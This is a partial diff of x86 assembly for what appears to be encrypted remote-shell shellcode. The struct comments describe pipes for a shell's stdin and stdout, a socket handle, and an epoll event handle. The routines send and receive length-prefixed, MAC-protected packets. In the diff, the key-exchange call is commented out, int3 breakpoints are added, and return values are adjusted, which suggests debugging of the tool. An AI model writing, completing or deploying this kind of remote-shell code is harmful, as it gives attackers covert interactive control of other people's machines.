@@ -92,13 +92,12 @@ struc crypto_ctx
 endstruc
          
 struc sc_prop
-  p_in  resd 2
-  p_out resd 2
-  pid   resd 1
-  s     resd 1  
-  efd   resd 1  
+  p_in  resd 2     ; pipe for stdin of shell
+  p_out resd 2     ; pipe for stdout/stderr of shell
+  pid   resd 1     ; process id for shell
+  s     resd 1     ; socket handle
+  efd   resd 1     ; event handle
   evts  resb epoll_event_size
-  len   resd 1
   buf   resb BUFSIZ
   ctx   resb crypto_ctx_size
 endstruc
@@ -129,6 +128,7 @@ _main:
       mov    cl, sc_prop_size
       sub    esp, ecx
       mov    edi, esp
+      
       ; memset(edi, 0, sc_prop_size)
       pushad
       xor    eax, eax
@@ -241,7 +241,7 @@ epx_con:
       int    0x80      
 
       ; attempt to secure the connection
-      call   key_xchg
+      ; call   key_xchg
       
       ; efd = epoll_create1(0);
       mov    eax, SYS_epoll_create1
@@ -381,7 +381,7 @@ cls_efd:
 ; buflen in edx
 ; buf in edi
 ; ctx in ebp
-; sock op in ebx : SYS_RECV or SYS_SEND
+; socket operation in ebx : SYS_RECV or SYS_SEND
 ; ***********************************      
 socket_io:
       pushad
@@ -411,7 +411,7 @@ io_loop:
       jmp    io_loop
 exit_io:
       test   eax, eax
-      mov    [esp+_eax], eax  ; return sum          
+      mov    [esp+_eax], esi  ; return sum          
       popad
       ret      
 ; ***********************************
@@ -440,22 +440,22 @@ send_pkt:
 ;
 ; ***********************************      
 spp_send:
+int3
       pushad      
       ; 1. send length (including MAC)
-      sub    esp, 4 + 8
+      sub    esp, 4 + 8      ; 4 byte length + mac
       mov    edi, esp
-      mov    dword[edi], edx
+      mov    dword[edi], edx ; store length of outgoing data
       add    dword[edi], 8
-      mov    dl, 4       
+      mov    dl, 4           ; send 4 bytes
       call   send_pkt
-      lea    esp, [esp+4+8]
+      lea    esp, [esp+4+8]  ; release stack
       mov    edx, [esp+_edx]
       jle    exit_send
       
       ; 2. send the data
       lea    edi, [ebp+evts]
-      call   send_pkt
-      test   eax, eax      
+      call   send_pkt      
 exit_send:
       mov    [esp+_eax], eax      
       popad
@@ -473,7 +473,9 @@ recv_pkt:
       ; 1. receive
       push   SYS_RECV
       pop    ebx
-      call   socket_io    
+      call   socket_io
+      jle    exit_rpkt
+      
       ; 2. unwrap
       push   1
       pop    ecx              ; ecx = DECRYPT
@@ -489,6 +491,7 @@ exit_rpkt:
 ;
 ; ***********************************      
 spp_recv:
+int3
       pushad
 
       ; 1. receive the length (which includes a MAC)
@@ -500,7 +503,6 @@ spp_recv:
       ; 2. receive the data
       mov    edx, [edi]        ; edx = buflen      
       call   recv_pkt
-      test   eax, eax
 exit_recv:
       mov    [esp+_eax], eax   ; return length or -1   
       popad
